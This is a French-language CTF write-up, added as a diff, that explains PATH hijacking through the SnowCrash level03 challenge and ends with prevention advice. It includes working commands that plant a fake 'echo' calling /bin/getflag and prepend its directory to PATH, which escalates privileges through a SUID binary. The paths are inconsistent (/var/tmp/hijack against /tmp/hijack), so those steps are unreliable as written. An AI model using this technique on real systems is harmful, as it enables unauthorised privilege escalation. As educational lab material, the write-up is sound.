@@ -1,0 +1,202 @@
+# Qu'est-ce que le PATH Hijacking en cybersécurité ?
+
+Le **PATH Hijacking**, ou détournement de la variable d'environnement `PATH`, est une technique qui consiste à modifier cette variable afin que le système exécute un faux programme à la place du programme original.
+
+Cette attaque est particulièrement dangereuse lorsqu'un programme disposant de privilèges élevés, par exemple grâce au mécanisme **SUID**, exécute une commande sans préciser son chemin absolu.
+
+## 1. Comprendre d'abord ce qu'est PATH
+
+Sous Linux, lorsque tu exécutes une commande comme `ls` :
+
+ls
+
+Le système doit déterminer où se trouve le fichier exécutable correspondant à cette commande.
+
+Pour le trouver, il recherche dans les répertoires définis dans la variable d'environnement `PATH`, en respectant leur ordre.
+
+Pour afficher la valeur de PATH :
+
+echo $PATH
+
+Par exemple, le résultat peut être :
+
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+Cela signifie que le système parcourt ces répertoires *dans l'ordre* pour trouver la commande demandée.
+
+Par exemple, lorsque tu exécutes :
+ls
+
+Le système trouve généralement le fichier suivant :
+/usr/bin/ls
+
+Tu peux vérifier l'emplacement d'une commande avec :
+
+which ls
+
+## 2. Où se trouve le problème de sécurité ?
+
+Imaginons qu'un programme sensible exécute la commande suivante :
+
+system("ls");
+
+Le problème est que le programme transmet uniquement le nom `ls` au système, sans préciser son chemin complet.
+
+Le système utilise donc la variable `PATH` pour trouver le fichier exécutable correspondant.
+
+Imaginons maintenant qu'un attaquant puisse modifier l'ordre des répertoires dans `PATH` et placer un répertoire qu'il contrôle au début de la liste.
+
+Par exemple :
+
+/var/tmp/attacker:/usr/local/bin:/usr/bin:/bin
+
+Dans cette situation, si un faux fichier exécutable nommé `ls` existe dans `/var/tmp/attacker`, le système peut exécuter ce fichier à la place de `/usr/bin/ls`.
+
+C'est ce qu'on appelle le **PATH Hijacking**.
+
+## 3. Exemple avec SnowCrash Level03
+
+Dans le niveau 03, lorsque nous avons analysé le fichier exécutable avec la commande `strings`, nous avons trouvé la chaîne suivante :
+
+/usr/bin/env echo Exploit me
+
+C'est un indice important.
+
+Le programme exécute probablement une commande similaire à celle-ci :
+
+system("/usr/bin/env echo Exploit me");
+
+Décomposons cette commande :
+
+- `/usr/bin/env` : un programme qui permet d'exécuter une autre commande.
+- `echo` : la commande à rechercher et à exécuter.
+- `Exploit me` : l'argument transmis à `echo`.
+
+Le point important est que le chemin de `echo` n'est pas spécifié de manière absolue.
+
+Cela signifie que `env` utilise la variable `PATH` pour rechercher `echo`.
+
+## 4. Comment peut-on exploiter cette faiblesse ?
+
+Supposons que le fichier exécutable `level03` appartienne à l'utilisateur `flag03` et que son bit SUID soit activé.
+
+Commençons par vérifier les permissions du fichier :
+
+ls -l ./level03
+
+Le résultat peut ressembler à ceci :
+
+-rwsr-sr-x 1 flag03 level03 8627 Mar 5 2016 level03
+
+Dans ce cas, le SUID est activé et l'exécution du programme peut se faire avec un EUID égal à `flag03`.
+
+Notre objectif est maintenant de faire exécuter un faux programme nommé `echo` à la place du véritable programme.
+
+### Étape 1 : Créer un répertoire pour notre faux programme
+
+mkdir /var/tmp/hijack
+
+### Étape 2 : Créer un faux fichier exécutable nommé echo
+
+printf '#!/bin/sh\n/bin/getflag\n' > /var/tmp/hijack/echo
+
+Le contenu du fichier est : (which getflag = /bin/getflag)
+
+#!/bin/sh
+/bin/getflag
+
+
+Cela signifie que lorsque ce fichier sera exécuté, il lancera la commande `getflag`.
+
+### Étape 3 : Ajouter le droit d'exécution
+
+chmod +x /tmp/hijack/echo
+
+
+### Étape 4 : Modifier PATH
+
+export PATH=/tmp/hijack:$PATH
+
+Maintenant, le début de PATH ressemble à ceci :
+
+/var/tmp/hijack:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+
+Ainsi, lorsque `env` recherche `echo`, il commence par vérifier le répertoire `/tmp/hijack`.
+
+Comme notre faux fichier `echo` s'y trouve, c'est celui-ci qui sera exécuté.
+
+### Étape 5 : Exécuter le programme original
+
+./level03
+
+
+Si les conditions d'exécution SUID sont réunies et que les privilèges effectifs sont conservés, le faux programme `echo` sera exécuté et la commande `getflag` sera appelée avec les privilèges effectifs appropriés.
+
+Nous pouvons alors obtenir le token du niveau.
+
+## 5. Visualiser le déroulement de l'attaque
+
+```text
+User : level03
+      |
+      | exécute
+      v
+  ./level03
+      |
+      | SUID activé
+      v
+  EUID = flag03
+      |
+      | system()
+      v
+/usr/bin/env echo Exploit me
+      |
+      | recherche echo en utilisant PATH
+      v
+/var/tmp/hijack/echo
+      |
+      | exécute
+      v
+  /bin/getflag
+      |
+      v
+  Token du niveau
+```
+
+## 6. Pourquoi cette vulnérabilité est-elle dangereuse ?
+
+Parce qu'un programme disposant de privilèges élevés fait confiance à l'environnement d'exécution contrôlé par l'utilisateur.
+
+Dans notre exemple :
+
+- Le programme appartient à `flag03`.
+- Le bit SUID est activé.
+- Le programme utilise `env` pour exécuter `echo`.
+- Le chemin de `echo` n'est pas spécifié de manière absolue.
+- L'attaquant peut manipuler la variable `PATH`.
+
+L'attaquant peut donc potentiellement exécuter une commande de son choix avec des privilèges plus élevés.
+
+## 7. Comment prévenir le PATH Hijacking ?
+
+Les programmes sensibles ne doivent pas faire confiance aux chemins d'exécution contrôlés par l'utilisateur.
+
+Par exemple, au lieu d'écrire :
+
+system("ls");
+
+
+Il vaut mieux utiliser le chemin absolu :
+
+system("/usr/bin/ls");
+
+Il est également recommandé de :
+
+- Éviter d'utiliser `system()` dans les programmes SUID.
+- Nettoyer ou limiter les variables d'environnement sensibles, notamment `PATH`.
+- Utiliser, si possible, `execve()` avec un chemin absolu et un environnement contrôlé.
+- Supprimer les privilèges qui ne sont pas nécessaires au programme.
+
+
+
